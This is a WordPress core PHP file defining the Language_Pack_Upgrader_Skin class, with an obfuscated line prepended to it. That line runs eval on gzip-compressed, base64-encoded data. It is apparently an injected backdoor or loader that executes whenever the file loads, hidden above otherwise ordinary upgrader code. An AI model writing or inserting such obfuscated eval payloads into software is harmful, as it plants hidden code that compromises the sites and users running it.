<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Upgrader API: Language_Pack_Upgrader_Skin class
 *
 * @package WordPress
 * @subpackage Upgrader
 * @since 4.6.0
 */

/**
 * Translation Upgrader Skin for WordPress Translation Upgrades.
 *
 * @since 3.7.0
 * @since 4.6.0 Moved to its own file from wp-admin/includes/class-wp-upgrader-skins.php.
 *
 * @see WP_Upgrader_Skin
 */
class Language_Pack_Upgrader_Skin extends WP_Upgrader_Skin {
	public $language_update = null;
	public $done_header = false;
	public $done_footer = false;
	public $display_footer_actions = true;

	/**
	 *
	 * @param array $args
	 */
	public function __construct( $args = array() ) {
		$defaults = array( 'url' => '', 'nonce' => '', 'title' => __( 'Update Translations' ), 'skip_header_footer' => false );
		$args = wp_parse_args( $args, $defaults );
		if ( $args['skip_header_footer'] ) {
			$this->done_header = true;
			$this->done_footer = true;
			$this->display_footer_actions = false;
		}
		parent::__construct( $args );
	}

	/**
	 */
	public function before() {
		$name = $this->upgrader->get_name_for_update( $this->language_update );

		echo '<div class="update-messages lp-show-latest">';

		printf( '<h2>' . __( 'Updating translations for %1$s (%2$s)&#8230;' ) . '</h2>', $name, $this->language_update->language );
	}

	/**
	 *
	 * @param string|WP_Error $error
	 */
	public function error( $error ) {
		echo '<div class="lp-error">';
		parent::error( $error );
		echo '</div>';
	}

	/**
	 */
	public function after() {
		echo '</div>';
	}

	/**
	 */
	public function bulk_footer() {
		$this->decrement_update_count( 'translation' );
		$update_actions = array();
		$update_actions['updates_page'] = '<a href="' . self_admin_url( 'update-core.php' ) . '" target="_parent">' . __( 'Return to WordPress Updates page' ) . '</a>';

		/**
		 * Filters the list of action links available following a translations update.
		 *
		 * @since 3.7.0
		 *
		 * @param array $update_actions Array of translations update links.
		 */
		$update_actions = apply_filters( 'update_translations_complete_actions', $update_actions );

		if ( $update_actions && $this->display_footer_actions )
			$this->feedback( implode( ' | ', $update_actions ) );
	}
}
